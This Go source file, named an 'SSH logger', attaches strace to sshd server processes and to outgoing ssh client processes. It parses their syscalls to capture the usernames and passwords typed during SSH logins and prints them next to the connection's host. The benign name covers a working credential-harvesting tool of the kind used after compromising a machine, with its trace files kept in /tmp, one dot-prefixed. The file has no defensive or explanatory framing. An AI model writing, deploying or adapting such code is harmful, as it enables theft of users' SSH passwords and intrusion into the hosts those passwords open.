package sshlogger

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

// SSHLog, SSH connection information
type SSHLog struct {
	Timestamp time.Time `json:"timestamp"`
	SourceIP  string    `json:"source_ip"`
	Username  string    `json:"username"`
}

// SSHLogger, represents the structure to monitor SSH connections
type SSHLogger struct {
	Active       bool
	TraceFile    string
	ActiveTraces sync.Map
	mutex        sync.Mutex
}

// NewSSHLogger creates a new SSHLogger
func NewSSHLogger() *SSHLogger {
	tmpDir := os.TempDir()
	traceFile := filepath.Join(tmpDir, ".ssh_strace.log")

	return &SSHLogger{
		Active:    false,
		TraceFile: traceFile,
	}
}

// Start, starts the SSH logger
func (s *SSHLogger) Start() error {
	if s.Active {
		return fmt.Errorf("SSH logger is already running")
	}

	if err := s.checkStrace(); err != nil {
		return fmt.Errorf("strace not found: %v", err)
	}

	s.Active = true

	// Monitor SSH server processes
	go s.monitorSSHDProcesses()
	// Monitor SSH client processes
	go s.monitorSSHClient()

	fmt.Println("SSH Logger started")
	return nil
}

// checkStrace, checks if strace is installed
func (s *SSHLogger) checkStrace() error {
	cmd := exec.Command("which", "strace")
	return cmd.Run()
}

// Stop, stops the SSH logger
func (s *SSHLogger) Stop() error {
	if !s.Active {
		return fmt.Errorf("SSH logger is already stopped")
	}

	s.Active = false

	s.ActiveTraces.Range(func(key, value interface{}) bool {
		if cmd, ok := value.(*exec.Cmd); ok && cmd.Process != nil {
			cmd.Process.Kill()
		}
		s.ActiveTraces.Delete(key)
		return true
	})

	fmt.Println("SSH Logger stopped")
	return nil
}

// monitorSSHDProcesses, monitors sshd processes (for incoming connections)
func (s *SSHLogger) monitorSSHDProcesses() {
	tracedPIDs := make(map[string]bool)

	for s.Active {
		// Find main sshd process
		cmd := exec.Command("pgrep", "-f", "^/usr/sbin/sshd")
		output, err := cmd.Output()
		if err == nil && len(output) > 0 {
			mainSSHDPid := strings.TrimSpace(string(output))
			if !tracedPIDs[mainSSHDPid] {
				s.traceProcess(mainSSHDPid, "sshd-main")
				tracedPIDs[mainSSHDPid] = true
			}
		}

		// Find SSH session processes
		cmd = exec.Command("ps", "aux")
		output, err = cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				// Find processes in sshd: user@ip format
				if strings.Contains(line, "sshd:") {
					fields := strings.Fields(line)
					if len(fields) > 1 {
						pid := fields[1]
						if !tracedPIDs[pid] {
							s.traceProcess(pid, "sshd-session")
							tracedPIDs[pid] = true
						}
					}
				}
			}
		}

		time.Sleep(1 * time.Second)
	}
}

// monitorSSHClient, monitors ssh clients (for outgoing connections)
func (s *SSHLogger) monitorSSHClient() {
	tracedPIDs := make(map[string]bool)

	for s.Active {
		cmd := exec.Command("pgrep", "-f", "^ssh ")
		output, err := cmd.Output()
		if err == nil && len(output) > 0 {
			pids := strings.Split(strings.TrimSpace(string(output)), "\n")
			for _, pid := range pids {
				if pid != "" && !tracedPIDs[pid] {
					s.traceProcess(pid, "ssh-client")
					tracedPIDs[pid] = true
				}
			}
		}

		time.Sleep(1 * time.Second)
	}
}

// traceProcess, monitors a process with strace
func (s *SSHLogger) traceProcess(pid, processType string) {
	traceFile := fmt.Sprintf("/tmp/ssh_strace_%s.log", pid)
	cmd := exec.Command("strace", "-f", "-e", "trace=connect,accept,accept4,read,write,recvfrom,sendto", "-p", pid, "-o", traceFile)
	err := cmd.Start()
	if err != nil {
		fmt.Printf("Error starting strace for PID %s: %v\n", pid, err)
		return
	}

	var lastSize int64 = 0
	var connectionInfo string
	var password string
	var collectingPassword bool
	var username string

	for s.Active {
		time.Sleep(1 * time.Second)

		if _, err := os.Stat(traceFile); os.IsNotExist(err) {
			continue
		}

		info, err := os.Stat(traceFile)
		if err != nil {
			continue
		}

		if info.Size() == lastSize {
			continue
		}

		file, err := os.Open(traceFile)
		if err != nil {
			continue
		}

		file.Seek(lastSize, io.SeekStart)

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()

			// Capture username from write(5
			if strings.Contains(line, "write(5") {
				writeMatch := regexp.MustCompile(`write\(5, "([^"]+)"`).FindStringSubmatch(line)
				if len(writeMatch) > 1 {
					content := writeMatch[1]
					if !strings.Contains(content, "password") && !strings.Contains(content, "Password") {
						username = strings.TrimSpace(content)
					}
				}
			}

			// Capture connection information
			if strings.Contains(line, "connect") || strings.Contains(line, "accept") || strings.Contains(line, "accept4") || strings.Contains(line, "recvfrom") || strings.Contains(line, "sendto") {
				if processType == "ssh-client" {
					// Get connection info for local SSH client
					cmd := exec.Command("ps", "-p", pid, "-o", "args=")
					output, err := cmd.Output()
					if err == nil {
						args := string(output)
						if strings.Contains(args, "@") {
							parts := strings.Split(args, "@")
							if len(parts) == 2 {
								if username == "" {
									username = strings.TrimSpace(parts[0])
								}
								hostPart := strings.Fields(parts[1])[0]
								connectionInfo = username + "@" + hostPart
								fmt.Printf("[Local] New SSH connection: %s\n", connectionInfo)
							}
						}
					}
				} else if processType == "sshd-session" {
					// Get connection info for remote SSH connection
					if username != "" {
						netstatCmd := exec.Command("netstat", "-tnp")
						netstatOutput, err := netstatCmd.Output()
						if err == nil {
							lines := strings.Split(string(netstatOutput), "\n")
							for _, line := range lines {
								if strings.Contains(line, pid) && strings.Contains(line, "ESTABLISHED") {
									fields := strings.Fields(line)
									if len(fields) > 4 {
										remoteAddr := fields[4]
										ipParts := strings.Split(remoteAddr, ":")
										if len(ipParts) > 0 {
											connectionInfo = username + "@" + ipParts[0]
											fmt.Printf("[Remote] New SSH connection: %s\n", connectionInfo)
										}
									}
								}
							}
						}
					}
				}
			}

			// Check for password prompt
			if strings.Contains(line, "password") || strings.Contains(line, "Password") {
				collectingPassword = true
				password = ""
				continue
			}

			// Collect password characters
			if collectingPassword {
				readMatch := regexp.MustCompile(`read\(\d+, "(.)", 1\)`).FindStringSubmatch(line)
				if len(readMatch) > 1 {
					char := readMatch[1]
					if char == "\\n" || char == "\n" {
						collectingPassword = false
						if connectionInfo != "" && password != "" {
							fmt.Printf("Connection: %s | Password: %s\n", connectionInfo, password)
						}
					} else {
						char = strings.ReplaceAll(char, "\\r", "")
						char = strings.ReplaceAll(char, "\\n", "")
						char = strings.ReplaceAll(char, "\\t", "")
						password += char
					}
				}
			}
		}

		lastSize = info.Size()
		file.Close()
	}

	cmd.Process.Kill()
	os.Remove(traceFile)
}

// SSHLoggerStart, starts the SSH logger
func SSHLoggerStart() error {
	logger := NewSSHLogger()
	err := logger.Start()
	if err != nil {
		fmt.Println("ERROR:", err)
		return err
	}

	return nil
}
